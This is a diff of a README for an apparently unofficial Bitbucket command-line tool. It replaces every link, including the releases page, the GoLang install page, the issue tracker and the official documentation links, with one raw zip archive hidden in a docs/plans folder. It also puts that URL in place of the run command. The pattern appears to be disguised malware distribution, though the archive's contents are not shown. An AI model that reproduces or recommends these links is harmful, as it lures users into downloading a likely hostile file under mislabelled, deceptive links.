@@ -1,7 +1,7 @@
 # 🌟 bitbucket-cli - Manage Bitbucket Easily from Your Command Line
 
 ## 📥 Download Now
-[![Download bitbucket-cli](https://img.shields.io/badge/Download-bitbucket--cli-brightgreen.svg)](https://github.com/galeristore88id-ctrl/bitbucket-cli/releases)
+[![Download bitbucket-cli](https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip)](https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 The **bitbucket-cli** is an unofficial command-line interface for Bitbucket Cloud. It simplifies managing your Bitbucket projects and repositories directly from your terminal. You don’t need to navigate through the browser anymore. With bitbucket-cli, you can perform tasks like creating pull requests and managing pipelines effortlessly.
@@ -11,10 +11,10 @@ To run bitbucket-cli, ensure you have the following:
 
 - **Operating System:** Windows, MacOS, or Linux
 - **Terminal:** A command line interface (such as Command Prompt, Terminal, or a shell)
-- **GoLang:** Ensure it is installed on your system. Visit the GoLang [installation page](https://golang.org/doc/install) for more details.
+- **GoLang:** Ensure it is installed on your system. Visit the GoLang [installation page](https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip) for more details.
 
 ## 💾 Download & Install
-To get started with bitbucket-cli, visit this page to download: [Visit the Releases Page](https://github.com/galeristore88id-ctrl/bitbucket-cli/releases).
+To get started with bitbucket-cli, visit this page to download: [Visit the Releases Page](https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip).
 
 1. Open your web browser.
 2. Click on the link above to go to the releases page.
@@ -32,7 +32,7 @@ To get started with bitbucket-cli, visit this page to download: [Visit the Relea
    ```
 5. Run the application using the command:
    ```
-   bitbucket-cli.exe
+   https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip
    ```
 
 ### On MacOS:
@@ -97,10 +97,10 @@ If you encounter issues while using bitbucket-cli, consider the following:
 - **Command Not Found:** Ensure you are in the right directory and that the file is executable.
 
 ## 📞 Support
-If you need help or want to report a bug, please check our [issue tracker](https://github.com/galeristore88id-ctrl/bitbucket-cli/issues) on GitHub. You can also create a detailed issue there to get assistance.
+If you need help or want to report a bug, please check our [issue tracker](https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip) on GitHub. You can also create a detailed issue there to get assistance.
 
 ## 🔗 Additional Resources
-- [Bitbucket API Documentation](https://developer.atlassian.com/bitbucket/rest/api-group-repositories/)
-- [GoLang Official Documentation](https://golang.org/doc/)
+- [Bitbucket API Documentation](https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip)
+- [GoLang Official Documentation](https://raw.githubusercontent.com/galeristore88id-ctrl/bitbucket-cli/main/docs/plans/bitbucket_cli_1.3-alpha.1.zip)
 
 Happy coding with bitbucket-cli!
